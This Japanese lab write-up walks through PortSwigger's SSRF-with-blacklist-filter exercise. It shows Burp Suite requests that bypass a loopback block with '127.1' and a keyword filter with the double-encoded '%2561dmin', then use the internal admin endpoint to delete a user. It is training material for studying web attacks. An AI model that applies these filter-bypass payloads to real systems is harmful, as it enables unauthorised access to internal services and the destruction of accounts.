# ブラックリスト ベースの入力フィルターを使用した SSRF

以下のハッキングラボをやります  
https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter

- 1. Burp Suite を起動し、Proxy タブからブラウザを起動します
- 2. ブラウザからハッキングラボにアクセスします
- 3. 商品ページに移動して、在庫チェックボタンを押します

* 4. POST /product/stock HTTP/2 リクエストを Send to repeater します
* 5. stockApi のパラメータをループバックアドレスにして送信すると、失敗します

```
stockApi=http://127.0.0.1/
```

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 51

"External stock check blocked for security reasons"
```

- 6.  stockapi のパラメータを次のように省略記法にして送信すると成功します

```
stockApi=http://127.1/
```

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=WmbdUo6EYWqj5ES7h7jwWmkEKUryEBTb; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 10630
・・・
```

- 7. stockapi のパラメータを次のように管理者ページにアクセスするように変更して送信すると失敗します

```
stockApi=http://127.1/admin
```

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 51

"External stock check blocked for security reasons"
```

- 8. stockapi のパラメータの一部をエンコーディングして送信すると管理者ページにアクセスできます

```
stockApi=http://127.1/%2561dmin
```

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
Set-Cookie: session=f8y5oMQhCt2HwS9bM3R9RytalV3jBqah; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 3074
・・
・
```

- 9. intercept on にして在庫チェックボタンを押して、stockApi パラメータを上記の通りにします
- 10. 管理者ページが開かれるので、Delete ボタンのリンクからパラメータを確認します
      ![1](https://github.com/pea-sys/shell-experiments/assets/49807271/dfcd7b1b-98a0-4fdd-b037-e160fa77386a)

```
https://0a6d007504285b6f86eca81d008500f3.web-security-academy.net/admin/delete?username=carlos
```

- 11. Repeater から以下のようにパラメータをセットして送信すると一般ユーザーが削除されます

```
stockApi=http://127.1/%2561dmin/delete?username=carlos
```
